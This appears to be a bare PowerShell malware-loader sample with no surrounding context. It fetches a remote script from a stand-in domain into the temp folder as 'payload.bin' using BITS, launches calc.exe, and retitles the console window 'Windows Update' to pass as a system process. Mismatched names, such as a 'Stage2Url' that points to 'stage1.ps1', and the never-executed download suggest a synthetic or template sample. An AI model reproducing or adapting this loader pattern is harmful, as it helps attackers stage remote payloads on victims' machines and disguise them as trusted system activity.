
<# Loader bootstrap #> $Stage2Url = "https://contoso.com/stage1.ps1"; $WorkingPath = "$env:TEMP\payload.bin"; $ConnectionTimeout = 211; Start-BitsTransfer -Source $Stage2Url -Destination $WorkingPath; Start-Process -FilePath "calc.exe"; Set-Location -Path $env:TEMP; $Host.UI.RawUI.WindowTitle = "Windows Update"
